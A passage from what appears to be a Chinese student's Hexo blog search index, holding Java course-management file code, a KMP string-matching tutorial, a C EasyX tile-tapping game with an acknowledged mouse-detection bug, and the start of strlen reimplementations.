class_">RandomAccessFile</span>(data_score,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(List l:score) &#123;</span><br><span class="line">            raf_score.write((l.get(<span class="number">0</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_score.write((l.get(<span class="number">1</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_score.write((l.get(<span class="number">2</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">        &#125;</span><br><span class="line">        raf_score.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//更新课程数据</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateAccountData</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        clearFile(data_account);</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">raf_account</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(data_account,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        raf_account.writeBytes(manager_id+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        raf_account.writeBytes(teacher_id+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        raf_account.writeBytes(student_id+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(String key:account.keySet()) &#123;</span><br><span class="line">            raf_account.write((key+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_account.write((account.get(key).get(<span class="number">0</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_account.write((account.get(key).get(<span class="number">1</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_account.write((account.get(key).get(<span class="number">2</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_account.write((account.get(key).get(<span class="number">3</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">        &#125;</span><br><span class="line">        raf_account.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 文件内容更新</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updataAll</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        updateCourseData();</span><br><span class="line">        updateScoreData();</span><br><span class="line">        updateAccountData();</span><br><span class="line">        System.out.println(<span class="string">&quot;update finish&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ScoreCellRenderer</span> <span class="keyword">extends</span> <span class="title class_">DefaultListCellRenderer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Component <span class="title function_">getListCellRendererComponent</span><span class="params">(JList list, Object value, <span class="type">int</span> index, <span class="type">boolean</span> isSelected, <span class="type">boolean</span> cellHasFocus)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);</span><br><span class="line">        List&lt;Integer&gt; ci = (List&lt;Integer&gt;) value;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.setText(<span class="string">&quot;学生编号: &quot;</span>+ci.get(<span class="number">0</span>)+<span class="string">&quot;   分数: &quot;</span>+ci.get(<span class="number">2</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CourseTeaCellRenderer</span> <span class="keyword">extends</span> <span class="title class_">DefaultListCellRenderer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Component <span class="title function_">getListCellRendererComponent</span><span class="params">(JList list, Object value, <span class="type">int</span> index, <span class="type">boolean</span> isSelected, <span class="type">boolean</span> cellHasFocus)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">ci</span> <span class="operator">=</span> (Integer) value;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">this</span>.setText(<span class="string">&quot;课程编号: &quot;</span>+ci);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CourseSelCellRenderer</span> <span class="keyword">extends</span> <span class="title class_">DefaultListCellRenderer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Component <span class="title function_">getListCellRendererComponent</span><span class="params">(JList list, Object value, <span class="type">int</span> index, <span class="type">boolean</span> isSelected, <span class="type">boolean</span> cellHasFocus)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);</span><br><span class="line">        Entry&lt;Integer, List&gt; ci = (Entry&lt;Integer, List&gt;) value;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.setText(<span class="string">&quot;课程编号: &quot;</span>+ci.getKey()+<span class="string">&quot;   课程名称: &quot;</span>+ci.getValue().get(<span class="number">0</span>)+<span class="string">&quot;   教师编号: &quot;</span>+ci.getValue().get(<span class="number">1</span>)+<span class="string">&quot;   课程信息: &quot;</span>+ci.getValue().get(<span class="number">2</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CourseDelCellRenderer</span> <span class="keyword">extends</span> <span class="title class_">DefaultListCellRenderer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Component <span class="title function_">getListCellRendererComponent</span><span class="params">(JList list, Object value, <span class="type">int</span> index, <span class="type">boolean</span> isSelected, <span class="type">boolean</span> cellHasFocus)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);</span><br><span class="line">        <span class="type">List</span> <span class="variable">ci</span> <span class="operator">=</span> (List) value;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.setText(<span class="string">&quot;课程编号: &quot;</span>+ci.get(<span class="number">1</span>)+<span class="string">&quot;   分数: &quot;</span>+ci.get(<span class="number">2</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TeaCellRenderer</span> <span class="keyword">extends</span> <span class="title class_">DefaultListCellRenderer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Component <span class="title function_">getListCellRendererComponent</span><span class="params">(JList list, Object value, <span class="type">int</span> index, <span class="type">boolean</span> isSelected, <span class="type">boolean</span> cellHasFocus)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);</span><br><span class="line">        Entry&lt;Integer, String&gt; ci = (Entry&lt;Integer, String&gt;) value;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.setText(<span class="string">&quot;编号: &quot;</span>+ci.getKey()+<span class="string">&quot;    姓名: &quot;</span>+ci.getValue());</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KMP算法</title>
      <link href="/2023/04/08/KMP%E7%AE%97%E6%B3%95/"/>
      <url>/2023/04/08/KMP%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="KMP-——-一种字符串匹配算法-学习自董晓算法"><a href="#KMP-——-一种字符串匹配算法-学习自董晓算法" class="headerlink" title="KMP —— 一种字符串匹配算法(学习自董晓算法)"></a>KMP —— 一种字符串匹配算法(学习自董晓算法)</h1><p>给定一个模式串P和一个主串S，求模式串P在主串S中出现的位置。（字符串下标均从1开始）</p><ol><li>去<em>最长的</em>想等前后缀，可以保证不漏解</li><li>通过模式串前后缀的自我匹配长度，计算<em>next函数</em>（降低事件复杂度的关键），给j指针打一张表，失配时跳到next[j]的位置继续匹配。</li></ol><p><em>next函数</em><br>next[i]表示模式串P[1,i]中相等前后缀的最长长度</p><p><img src="https://s2.loli.net/2023/04/09/GrWayKlLNJei2bz.png" alt="image.png"></p><h2 id="next数组代码"><a href="#next数组代码" class="headerlink" title="next数组代码"></a>next数组代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ne[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>,j = <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line"><span class="keyword">while</span> (j &amp;&amp; p[i] != p[j + <span class="number">1</span>])</span><br><span class="line">j = ne[j];</span><br><span class="line"><span class="keyword">if</span> (p[i] == p[j + <span class="number">1</span>])</span><br><span class="line">j++;</span><br><span class="line">ne[i] = j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>双指针</em>： i扫描模式串, j扫描前缀。<br>初始化，ne[1]&#x3D;0,i&#x3D;2,j&#x3D;0.(固定的)<br>每轮for循环，i向右走一步。</p><ol><li>若p[i]!&#x3D;p[j+1],让j回跳到能匹配的位置，如果找不到能匹配的位置，j跳回0.</li><li>若p[i]&#x3D;&#x3D;p[j+1],让j+1，指向匹配前缀的末尾。</li><li>next[i]&#x3D;j.</li><li>j指针所走的总步数就决定乐总的执行次数，每轮for，j至多+1，那么j一共向右至多走n步，往左挑的部署加起来不超过n步，否则j变为负数，故j的总步数不会超过2n。例 a–ab.所以时间复杂度O(n)</li></ol><p><img src="https://s2.loli.net/2023/04/09/fmOwFJPICvQtaZh.png" alt="image.png"></p><h2 id="模式串与主串匹配代码"><a href="#模式串与主串匹配代码" class="headerlink" title="模式串与主串匹配代码"></a>模式串与主串匹配代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; S[i] != P[j+<span class="number">1</span>]) </span><br><span class="line">        j = ne[j];</span><br><span class="line">        <span class="keyword">if</span>(S[i] == P[j+<span class="number">1</span>]) </span><br><span class="line">        j ++;</span><br><span class="line">        <span class="keyword">if</span>(j == n) </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i-n+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>双指针: i扫描主串，j扫描模式串。<br>初始化，i&#x3D;1，j&#x3D;0.<br>每轮for，i向右走一步。</p><ol><li>若s[i]!&#x3D;p[j+1],让j回跳到能匹配的位置，如果找不到能匹配的位置，j回跳到0.</li><li>若s[i]&#x3D;&#x3D;p[j+1],让j向右走一步。</li><li>若匹配成功，输出匹配位置。</li><li>时间复杂度同样是O(n)</li></ol><p><img src="https://s2.loli.net/2023/04/09/Lfxs64gRqjUoJdX.png" alt="image.png"></p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> m, n;</span><br><span class="line"><span class="type">char</span> S[N], P[N];</span><br><span class="line"><span class="type">int</span> ne[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin &gt;&gt; S+<span class="number">1</span> &gt;&gt; P+<span class="number">1</span>;</span><br><span class="line">    m = <span class="built_in">strlen</span>(S+<span class="number">1</span>), n = <span class="built_in">strlen</span>(P+<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 计算next函数</span></span><br><span class="line">    <span class="built_in">puts</span>(S);</span><br><span class="line">    <span class="built_in">puts</span>(P); </span><br><span class="line">    <span class="comment">//printf(&quot;%d %d&quot;,m ,n);</span></span><br><span class="line">    ne[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>, j = <span class="number">0</span>; i &lt;= n; i ++)&#123;</span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; P[i] != P[j+<span class="number">1</span>]) j = ne[j];</span><br><span class="line">        <span class="keyword">if</span>(P[i] == P[j+<span class="number">1</span>]) j ++; </span><br><span class="line">        ne[i] = j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// KMP匹配</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= m; i ++)&#123;</span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; S[i] != P[j+<span class="number">1</span>]) j = ne[j];</span><br><span class="line">        <span class="keyword">if</span>(S[i] == P[j+<span class="number">1</span>]) j ++;</span><br><span class="line">        <span class="keyword">if</span>(j == n) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i-n+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, ne[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>别踩白块儿</title>
      <link href="/2023/04/05/%E5%88%AB%E8%B8%A9%E7%99%BD%E5%9D%97%E5%84%BF/"/>
      <url>/2023/04/05/%E5%88%AB%E8%B8%A9%E7%99%BD%E5%9D%97%E5%84%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="鼠标判断不正常-待填的坑"><a href="#鼠标判断不正常-待填的坑" class="headerlink" title="鼠标判断不正常(待填的坑)"></a>鼠标判断不正常(待填的坑)</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;easyx.h&gt;</span>  <span class="comment">//图形库，绘制图形，输出文字</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 别踩白块：c+easyx</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERVAL 100 <span class="comment">//标题高度</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GRID_W 100 <span class="comment">//块的宽度</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GRID_H 150 <span class="comment">//块的高度</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义数组，存储黑块</span></span><br><span class="line"><span class="type">int</span> flags[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//统计成功点了多少个黑块</span></span><br><span class="line"><span class="type">int</span> gCount = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//设置随机数种子</span></span><br><span class="line"><span class="built_in">srand</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line"><span class="comment">//随机生成黑块</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">flags[i] = <span class="built_in">rand</span>() % <span class="number">4</span>;<span class="comment">//0,1,2,3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">draw</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* title = <span class="string">&quot;别踩白块儿&quot;</span>;</span><br><span class="line"><span class="built_in">setlinestyle</span>(PS_SOLID, <span class="number">2</span>);</span><br><span class="line"><span class="comment">//线条的颜色，默认是白色</span></span><br><span class="line"><span class="built_in">setlinecolor</span>(BLACK);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//画横线</span></span><br><span class="line"><span class="built_in">line</span>(<span class="number">0</span>, i * <span class="number">150</span> + INTERVAL, <span class="number">400</span>, i * <span class="number">150</span> + INTERVAL);</span><br><span class="line"><span class="comment">//画竖线</span></span><br><span class="line"><span class="built_in">line</span>(<span class="number">100</span> * i, INTERVAL, i * <span class="number">100</span>, <span class="number">700</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置文字颜色,样式</span></span><br><span class="line"><span class="built_in">settextcolor</span>(BLACK);</span><br><span class="line"><span class="built_in">settextstyle</span>(<span class="number">38</span>, <span class="number">0</span>, <span class="string">&quot;Arial&quot;</span>);</span><br><span class="line"><span class="comment">//输出标题(居中)</span></span><br><span class="line"><span class="type">int</span> spaceW = (<span class="built_in">getwidth</span>() - <span class="built_in">textwidth</span>(title)) / <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> spaceH = (INTERVAL - <span class="built_in">textheight</span>(title)) / <span class="number">2</span>;</span><br><span class="line"><span class="built_in">outtextxy</span>(spaceW, spaceH, title);</span><br><span class="line"></span><br><span class="line"><span class="comment">//绘制黑块</span></span><br><span class="line"><span class="built_in">setfillcolor</span>(BLACK);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//求出黑块的左上角坐标;</span></span><br><span class="line"><span class="type">int</span> x = flags[i] * GRID_W;</span><br><span class="line"><span class="type">int</span> y = i * GRID_H + INTERVAL;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">setfillcolor</span>(<span class="built_in">RGB</span>(<span class="number">156</span>, <span class="number">156</span>, <span class="number">156</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//绘制一个矩形</span></span><br><span class="line"><span class="built_in">fillrectangle</span>(x, y, x + GRID_W, y + GRID_H);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出分数</span></span><br><span class="line"><span class="built_in">settextstyle</span>(<span class="number">26</span>, <span class="number">0</span>, <span class="string">&quot;微软雅黑&quot;</span>);</span><br><span class="line"><span class="type">char</span> score[<span class="number">30</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">sprintf_s</span>(score,<span class="string">&quot;Score:%d&quot;</span>, gCount);</span><br><span class="line"></span><br><span class="line"><span class="built_in">outtextxy</span>(<span class="number">20</span>, <span class="number">40</span>, score);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理鼠标点击</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">mousePressMsg</span><span class="params">(ExMessage* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//获取下标为2的黑块的坐标</span></span><br><span class="line"><span class="type">int</span> x = flags[<span class="number">2</span>]*GRID_W;</span><br><span class="line"><span class="type">int</span> y = <span class="number">2</span> * GRID_H + INTERVAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是不是点击的下标为2的黑块</span></span><br><span class="line"><span class="keyword">if</span> (msg-&gt;x &gt; x &amp;&amp; x &lt; x + GRID_W  &amp;&amp; msg-&gt;y &gt; y &amp;&amp; msg-&gt;y &lt; y + GRID_H)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//黑块从上往下移动</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">3</span>; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">flags[i] = flags[i - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">flags[<span class="number">0</span>] = <span class="built_in">rand</span>() % <span class="number">4</span>;<span class="comment">//随机生成</span></span><br><span class="line">gCount++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;你点击了正确的黑块\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//printf(&quot;%s&quot;, __FUNCTION__); /* 输出是什么函数 */</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gameOverHit</span><span class="params">(<span class="type">int</span> w, <span class="type">int</span> h)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">setlinecolor</span>(GREEN);</span><br><span class="line"><span class="built_in">setfillcolor</span>(<span class="built_in">RGB</span>(<span class="number">93</span>, <span class="number">107</span>, <span class="number">153</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//画一个矩形</span></span><br><span class="line"><span class="type">int</span> spaceH = (<span class="built_in">getwidth</span>() - w) / <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> spaceV = (<span class="built_in">getwidth</span>() - h) / <span class="number">2</span>;</span><br><span class="line"><span class="built_in">fillrectangle</span>(spaceH, spaceV, spaceH + w, spaceV + h);</span><br><span class="line"><span class="type">int</span> mid_w = (spaceH + w) / <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> mid_h = (<span class="number">2</span>*spaceV+h) / <span class="number">2</span>;</span><br><span class="line"><span class="built_in">outtextxy</span>(mid_w, mid_h, <span class="string">&quot;lyx is sb&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1.黑窗口，来个图形窗口</span></span><br><span class="line"><span class="built_in">initgraph</span>(<span class="number">400</span>, <span class="number">700</span>, EX_SHOWCONSOLE);</span><br><span class="line"><span class="comment">//设置背景颜色</span></span><br><span class="line"><span class="built_in">setbkcolor</span>(WHITE);</span><br><span class="line"><span class="built_in">cleardevice</span>();</span><br><span class="line"><span class="built_in">setbkmode</span>(TRANSPARENT);</span><br><span class="line"><span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">draw</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//游戏主循环</span></span><br><span class="line"><span class="type">bool</span> isDone = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">while</span> (!isDone)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//消息(鼠标)处理</span></span><br><span class="line">ExMessage msg = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">peekmessage</span>(&amp;msg))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//按ESC退出游戏</span></span><br><span class="line"><span class="keyword">switch</span> (msg.message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_KEYDOWN:</span><br><span class="line"><span class="keyword">if</span> (msg.vkcode == VK_ESCAPE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;quit\n&quot;</span>);</span><br><span class="line">isDone = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">mousePressMsg</span>(&amp;msg))</span><br><span class="line">&#123;</span><br><span class="line">isDone = <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//绘制</span></span><br><span class="line"><span class="built_in">BeginBatchDraw</span>();<span class="comment">//清除缓存</span></span><br><span class="line"><span class="built_in">cleardevice</span>();<span class="comment">//清屏</span></span><br><span class="line"><span class="built_in">draw</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">EndBatchDraw</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">gameOverHit</span>(<span class="number">200</span>,<span class="number">150</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//设置线条的样式</span></span><br><span class="line"><span class="comment">setlinestyle(PS_SOLID, 3);</span></span><br><span class="line"><span class="comment">//设置线条yanse</span></span><br><span class="line"><span class="comment">setlinecolor(RED);</span></span><br><span class="line"><span class="comment">//绘制线条</span></span><br><span class="line"><span class="comment">line(0, 0, 640, 480);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//设置填充颜色</span></span><br><span class="line"><span class="comment">setfillcolor(GREEN);</span></span><br><span class="line"><span class="comment">//绘制矩形</span></span><br><span class="line"><span class="comment">rectangle(50, 50, 50 + 250, 50 + 50);</span></span><br><span class="line"><span class="comment">fillrectangle(50, 160, 50 + 250, 60 + 50);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字符串函数模拟实现</title>
      <link href="/2023/04/02/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0/"/>
      <url>/2023/04/02/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="size-t-strlen-const-char-str-求字符串长度"><a href="#size-t-strlen-const-char-str-求字符串长度" class="headerlink" title="size_t strlen(const char* str)求字符串长度"></a>size_t strlen(const char* str)求字符串长度</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="comment">//1.计数器版本</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_strlen</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">assert(str != <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">while</span> (*str != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">count++;</span><br><span class="line">str++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr[] = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"><span class="type">int</span> len = my_strlen(arr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, len);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span 